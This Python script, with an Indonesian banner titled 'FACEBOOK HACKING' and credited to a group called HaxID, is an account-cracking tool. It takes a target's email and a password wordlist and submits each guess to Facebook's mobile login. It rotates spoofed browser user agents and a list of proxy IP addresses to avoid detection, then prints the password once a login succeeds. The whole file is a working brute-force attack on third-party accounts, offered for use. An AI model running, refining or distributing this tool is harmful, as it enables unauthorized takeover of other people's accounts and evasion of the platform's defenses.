import requests
from bs4 import BeautifulSoup
import time
import os
import random
sleep = time.sleep
import platform,os
def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)

tampil('''\rh
          ___   ___   _  _   
         | __| | _ ) | || |  \rk*\rcAsecC|~|eror404
         | _|  | _ \ | __ |  
        _|_|_  |___/ |_||_|  
 \rp |"""""|| """ |\rmHaxID\rp|"""""||"""""| 
      "`-0-0-'"`-0-0-'"`-0-0-'   
      
\rmKita semua bangkit dan berdiri untuk suatu perubahan
\rc####################################################
             \rh*\rpFACEBOOK HACKING\rh*
             	\rp*\rkFB Target\rp*
             		
 \rhAuthor :\33[36;1m AsecC\rm|~|\rheror404
 \rhTeam   :\33[36;1m Hax\rhID
 \rhContact:\33[36;1m sempakbasah\rm044\rh@gmail.com
 
\rc####################################################
\rmNOTE:Sekali anda memahami, seribu kali anda mengerti''')
tampil('''''')
tampil('''''')

user_agent_list = [
   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
]

proxies_list = [
    'http://10.10.1.10:3128',
    'http://77.232.139.200:8080',
    'http://78.111.125.146:8080',
    'http://77.239.133.146:3128',
    'http://74.116.59.8:53281',
    'http://67.53.121.67:8080',
    'http://67.78.143.182:8080',
    'http://62.64.111.42:53281',
    'http://62.210.251.74:3128',
    'http://62.210.105.103:3128',
    'http://5.189.133.231:80',
    'http://46.101.78.9:8080',
    'http://45.55.86.49:8080',
    'http://40.87.66.157:80',
    'http://45.55.27.246:8080',
    'http://45.55.27.246:80',
    'http://41.164.32.58:8080',
    'http://45.125.119.62:8080',
    'http://37.187.116.199:80',
    'http://43.250.80.226:80',
    'http://43.241.130.242:8080',
    'http://38.64.129.242:8080',
    'http://41.203.183.50:8080',
    'http://36.85.90.8:8080',
    'http://36.75.128.3:80',
    'http://36.81.255.73:8080',
    'http://36.72.127.182:8080',
    'http://36.67.230.209:8080',
    'http://35.198.198.12:8080',
    'http://35.196.159.241:8080',
    'http://35.196.159.241:80',
    'http://27.122.224.183:80',
    'http://223.206.114.195:8080',
    'http://221.120.214.174:8080',
    'http://223.205.121.223:8080',
    'http://222.124.30.138:80',
    'http://222.165.205.204:8080',
    'http://217.61.15.26:80',
    'http://217.29.28.183:8080',
    'http://217.121.243.43:8080',
    'http://213.47.184.186:8080',
    'http://207.148.17.223:8080',
    'http://210.213.226.3:8080',
    'http://202.70.80.233:8080',
]
URL = 'https://m.facebook.com/login'
sleep(2)
tampil('''\rbExample : \rkHaxID\rp@yahoo.com''')
email = input('\r\033[32;1m[\33[31;1m*\33[32;1m]\33[36;1mMasukkan \33[31;1mEmail/Id \33[36;1mTarget : \33[32;1m ')
sleep(1)
sandi = input('\r\033[32;1m[\33[31;1m*\33[32;1m]\33[36;1mMasukkan Whordlist \33[31;1m(Password.txt) \33[36;1m: \33[32;1m ')
passw = open(sandi, 'r')
tampil('''\rmCracking Password''')
def br():
   for password in passw:
       form_data = {'email' : email,
                    'pass' : password
                   }
       user_agent = random.choice(user_agent_list)
       headers = {'User-Agent': user_agent}
       proxies_a = random.choice(proxies_list)
       proxies = {'http': proxies_a}
       with requests.Session() as c:
           c.get(URL, headers=headers, proxies=proxies)
           r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
           b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
           soup = BeautifulSoup(b.content, 'html.parser')
           a = soup.find('title')
           if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
                print ('\033[32;1m[\33[31;1m?\33[32;1m]\033[36;1mMencoba \033[32;1m==> \033[31;1m', password,end="", flush=True)
                print ('\r', end="", flush=True)
           else:
                print ('\033[32;1m[\33[36;1m√\33[32;1m]Mencoba\033[31;1m[\033[36;1m100%\033[31;1m]\033[0m :\33[32;1m', password, end="", flush=True)
                sleep(1)
                tampil('''''')
                tampil('''\rpLogin Succes\n''')
                print ('\033[32;1m[\33[36;1m√\33[32;1m]\033[36;1mPassword Adalah\33[31;1m==> \033[32;1m' + password)
                exit()
   
   tampil('''\rmPassowrd.txt \rpHabis Silahkan Coba Lagi''')

br()